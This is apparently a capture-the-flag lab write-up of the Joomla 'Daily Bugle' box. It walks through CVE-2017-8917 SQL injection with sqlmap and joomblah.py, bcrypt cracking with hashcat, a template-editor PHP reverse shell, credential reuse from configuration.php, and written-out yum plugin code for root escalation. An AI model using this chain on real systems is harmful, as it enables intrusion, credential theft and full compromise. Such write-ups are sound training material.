Hard joomla sqli cve-2017-8917 gtfobins

Spider-Man themed Joomla box. Fingerprint a vulnerable 3.7.0 instance, exploit CVE-2017-8917 (SQL injection in com_fields) to extract a bcrypt password hash, crack it, abuse the admin template editor for RCE, pivot via a password reused from the DB config, and finish with a sudo yum GTFOBins escape.

01 Reconnaissance

nmap -sCV -p- -T4 10.10.X.X -oN nmap.txt
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
3306/tcp open  mysql   MariaDB (unauthorized)

CentOS with Apache/PHP — a strong hint we're dealing with an older CMS. The landing page is a Joomla front-end styled as the Daily Bugle newspaper.

02 Joomla version fingerprinting

Joomla exposes its version in several public files — the two reliable ones:

curl -s http://10.10.X.X/administrator/manifests/files/joomla.xml | head -20
curl -s http://10.10.X.X/README.txt | head -5
<version>3.7.0</version>
<name>files_joomla</name>
<author>Joomla! Project</author>

Joomla 3.7.0 is famously vulnerable to CVE-2017-8917 — an unauthenticated SQL injection in the com_fields component. Confirm with joomscan if you want redundant output:

joomscan --url http://10.10.X.X

03 CVE-2017-8917 — SQL injection

The injection point is the list[fullordering] parameter. You can use the public PoC joomblah.py or just sqlmap — I'll show both.

Method A — sqlmap

sqlmap -u "http://10.10.X.X/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" \
  --risk=3 --level=5 --random-agent -p list[fullordering] \
  -D joomla -T '#__users' -C 'username,password' --dump

sqlmap will prompt to URL-encode the column name (answer yes) and eventually dump the users table.

Method B — joomblah.py

git clone https://github.com/stefanlucas/Exploit-Joomla
cd Exploit-Joomla
python2 joomblah.py http://10.10.X.X
[-] Fetching CSRF token
[-] Testing SQLi
[+] Found table: #__users
[+] Extracting users
    Found user: ['811', 'Super User', 'jonah',
      'jonah@tryhackme.com',
      '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm',
      '', '0', '0', '2020-07-13 19:58:02', ...]

We've got jonah's bcrypt hash. Note he's a Super User — gold.

04 Cracking the bcrypt hash

Bcrypt is hashcat mode 3200:

echo '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm' > hash.txt
hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force

Bcrypt is slow — expect minutes, not seconds. Result:

$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm:spiderman123

Login at /administrator/ as jonah : spiderman123.

05 Template RCE → www-data

With Super User access, we have several RCE paths in the Joomla backend. The cleanest is the template editor.

Navigate: Extensions → Templates → Templates (not Styles). Pick beez3 Details and Files, then open error.php and replace the entire content with a PHP reverse shell. Grab the php-pentestmonkey payload from revshells.com (set your IP and port, select PHP PentestMonkey), paste it in, and save.

Save template. Start a listener:

nc -lnvp 4444

Trigger — the Beez3 error.php is reachable directly:

curl http://10.10.X.X/templates/beez3/error.php

If that path 404s on your instance, force any Joomla error and the template renders it; e.g. curl http://10.10.X.X/index.php?option=com_invalid.

Shell lands as apache (CentOS's www-data). Stabilise:

python -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm

06 Credential reuse → jjameson

Joomla stores its DB credentials in configuration.php at the webroot:

cat /var/www/html/configuration.php | grep -Ei "user|pass|host"
public $user = 'root';
public $password = '<long_password_string>';
public $db = 'joomla';
public $host = 'localhost';

Check who has a login shell:

cat /etc/passwd | grep -E "bash|sh$"
root:x:0:0:root:/root:/bin/bash
jjameson:x:1000:1000::/home/jjameson:/bin/bash

The DB password is reused for the system user jjameson:

su jjameson
# <paste the DB password from configuration.php>
cat /home/jjameson/user.txt
On the current Daily Bugle instance the DB/system password is a memorable Rick-Astley reference — take whatever configuration.php gives you and use it verbatim. If su complains, double-check you haven't mixed up quoting or leading whitespace when copying.

07 sudo yum → root

sudo -l
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum

Passwordless yum is a straight trip to root via GTFOBins. The reliable method is the plugin technique — we tell yum to load a custom plugin path containing a Python plugin that spawns a shell when yum initialises:

TF=$(mktemp -d)

cat > $TF/x.conf <<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat > $TF/y.conf <<EOF
[main]
enabled=1
EOF

cat > $TF/y.py <<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version = '2.1'
def init_hook(conduit):
    os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x.conf --enableplugin=y

yum starts up, loads our plugin, the init_hook fires, and execl swaps the process for /bin/sh running as root. Finish up:

# id → uid=0(root) gid=0(root)
cat /root/root.txt

08 Wrap-up

What makes Daily Bugle a good hard-tier box is that none of the individual steps is hard — they're all standard OSCP-flavoured techniques — but you have to chain six of them cleanly:

  1. Service & version enum → Joomla 3.7.0.
  2. CVE lookup → CVE-2017-8917 (com_fields SQLi).
  3. SQLi dump → bcrypt hash.
  4. Hashcat -m 3200 + rockyou → spiderman123.
  5. Template editor RCE as apache.
  6. Credential hunting in configuration.php → password reuse to jjameson.
  7. sudo yum GTFOBins plugin trick → root.

Takeaway: every CMS has a configuration/wp-config/.env type file. The first thing to do after landing a web-user shell is find / -name "*config*" 2>/dev/null and look for reused passwords.
